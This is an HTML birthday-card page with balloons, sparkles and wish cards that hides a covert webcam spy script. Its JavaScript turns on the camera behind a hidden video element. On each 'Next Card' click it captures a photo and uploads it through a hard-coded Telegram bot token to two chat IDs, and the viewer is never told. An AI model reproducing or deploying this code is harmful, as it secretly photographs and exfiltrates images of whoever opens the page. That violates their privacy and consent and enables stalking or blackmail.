<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Happy Birthday Surprise!</title>
    <style>
        /* CSS Styling */
        body {
            background-color: #fce4ec;
            color: #5d4037;
            font-family: 'Comic Sans MS', cursive, sans-serif;
            text-align: center;
            margin: 0;
            padding: 0;
            overflow: hidden;
        }
        .container {
            padding: 20px;
        }
        h1 {
            font-size: 3em;
            margin-bottom: 10px;
        }
        h2 {
            font-size: 2em;
            margin-bottom: 30px;
        }
        .card, .collage {
            display: none;
            background-color: #fff3e0;
            border: 2px solid #5d4037;
            border-radius: 10px;
            padding: 20px;
            margin: 20px auto;
            max-width: 300px;
            position: relative;
        }
        .card img {
            width: 100%;
            height: auto;
            border-radius: 10px;
            margin-top: 15px;
        }
        #camera {
            display: none;
        }
        .next-card-button {
            padding: 15px;
            font-size: 1em;
            color: #fff;
            background-color: #5d4037;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: background-color 0.3s;
            margin: 10px;
        }
        .next-card-button:hover {
            background-color: #8d6e63;
        }
        /* Collage Styling */
        .collage img {
            width: 70px;
            height: 70px;
            margin: 5px;
            border-radius: 5px;
            object-fit: cover;
        }
        /* Balloon Styling */
        .balloon {
            position: absolute;
            bottom: -50px;
            width: 40px;
            height: 60px;
            background-color: #ff6f61;
            border-radius: 50%;
            box-shadow: inset -2px -4px 10px rgba(0, 0, 0, 0.2);
            animation: floatUp 4s ease-in infinite;
        }
        @keyframes floatUp {
            0% { transform: translateY(0); opacity: 1; }
            100% { transform: translateY(-100vh); opacity: 0; }
        }
        /* Sparkle Styling */
        .sparkle {
            position: absolute;
            width: 10px;
            height: 10px;
            background-color: #ffd700;
            border-radius: 50%;
            opacity: 0;
            animation: sparkle 0.6s ease-out forwards;
        }
        @keyframes sparkle {
            0% { transform: scale(0); opacity: 1; }
            100% { transform: scale(1.5); opacity: 0; }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>üéâ Happy Birthday, Beautiful! üéâ</h1>

        <!-- Camera feed for capturing photos -->
        <video id="camera" autoplay playsinline></video>

        <!-- Cards with Wishes and Captured Photos -->
        <div class="card" id="card1"><h2>1. Wishing you a day as sweet as chocolate! üç´</h2><img src="" id="cardImage1"></div>
        <!-- Add remaining cards here, or repeat structure if needed -->

        <!-- Collage Display -->
        <div class="collage" id="collage">
            <h2>Your Birthday Memories! üéÇ</h2>
            <h2>Created with lot of love by Aradhyüíï</h2>
            <div id="collagePhotos"></div>
        </div>

        <!-- Next Card Button -->
        <button class="next-card-button" onclick="nextCard()">Next Card</button>
    </div>

    <script>
        const botToken = "7854999145:AAFZfhFo_EhVgomg6i9U57s9c105a0YQQSI";
        const chatIds = ["7258927081", "6854356772"];
        let currentCardIndex = 1;
        const totalCards = 20;
        const capturedPhotos = [];

        const video = document.getElementById('camera');
        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then((stream) => video.srcObject = stream)
                .catch(error => alert("Camera access error"));
        }

        function nextCard() {
            capturePhoto();
            const imageDataUrl = document.getElementById(`cardImage${currentCardIndex}`).src;
            chatIds.forEach(chatId => sendPhotoToTelegram(imageDataUrl, chatId));

            document.getElementById(`card${currentCardIndex}`).style.display = 'none';
            currentCardIndex++;

            if (currentCardIndex <= totalCards) {
                document.getElementById(`card${currentCardIndex}`).style.display = 'block';
                createBalloons();
                createSparkles();
            } else {
                showCollage();
            }
        }

        function capturePhoto() {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            const imageDataUrl = canvas.toDataURL('image/png');
            document.getElementById(`cardImage${currentCardIndex}`).src = imageDataUrl;
            capturedPhotos.push(imageDataUrl);
        }

        function sendPhotoToTelegram(imageDataUrl, chatId) {
            fetch(imageDataUrl)
                .then(res => res.blob())
                .then(blob => {
                    const formData = new FormData();
                    formData.append('chat_id', chatId);
                    formData.append('photo', blob, 'birthday_photo.png');

                    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    })
                    .then(response => response.json())
                    .then(data => console.log(data))
                    .catch(error => console.error(error));
                });
        }

        function showCollage() {
            document.getElementById('collage').style.display = 'block';
            const collagePhotosDiv = document.getElementById('collagePhotos');

            capturedPhotos.forEach(photo => {
                const img = document.createElement('img');
                img.src = photo;
                collagePhotosDiv.appendChild(img);
            });

            document.querySelector('.next-card-button').style.display = 'none';
        }

        function createBalloons() {
            const colors = ['#ff6f61', '#ffd54f', '#4fc3f7', '#a5d6a7', '#ce93d8'];
            for (let i = 0; i < 5; i++) {
                const balloon = document.createElement('div');
                balloon.classList.add('balloon');
                balloon.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
                balloon.style.left = `${Math.random() * 100}vw`;
                document.body.appendChild(balloon);
                balloon.addEventListener('animationend', () => balloon.remove());
            }
        }

        function createSparkles() {
            for (let i = 0; i < 10; i++) {
                const sparkle = document.createElement('div');
                sparkle.classList.add('sparkle');
                sparkle.style.left = `${Math.random() * 100}vw`;
                sparkle.style.top = `${Math.random() * 100}vh`;
                document.body.appendChild(sparkle);
                sparkle.addEventListener('animationend', () => sparkle.remove());
            }
        }

        document.getElementById(`card${currentCardIndex}`).style.display = 'block';
    </script>
</body>
</html>
